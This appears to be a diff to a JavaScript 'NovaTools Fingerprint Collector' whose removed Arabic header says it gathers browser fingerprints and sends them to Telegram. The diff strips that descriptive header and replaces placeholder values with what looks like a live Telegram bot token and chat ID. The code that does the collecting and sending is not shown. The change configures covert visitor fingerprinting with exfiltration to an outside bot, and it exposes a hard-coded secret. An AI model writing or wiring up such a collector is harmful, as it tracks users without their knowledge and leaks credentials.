@@ -1,11 +1,5 @@
-/* ============================================================
- * NovaTools Fingerprint Collector
- * يجمع بصمات المتصفح ويرسلها لتليجرام
- * ============================================================ */
-
-/* ▼▼▼ املأ القيم هنا ▼▼▼ */
-const TG_BOT_TOKEN = "ضع_التوكن_هنا";
-const TG_CHAT_ID   = "ضع_chat_id_هنا";
+const TG_BOT_TOKEN = "8997821992:AAEmiPLNNKT5F0y99QWP6dY8qBTJYU3wo9Y";
+const TG_CHAT_ID   = "8997821992";
 /* ▲▲▲ املأ القيم هنا ▲▲▲ */
 
 const fingerprint = { started: new Date().toISOString() };
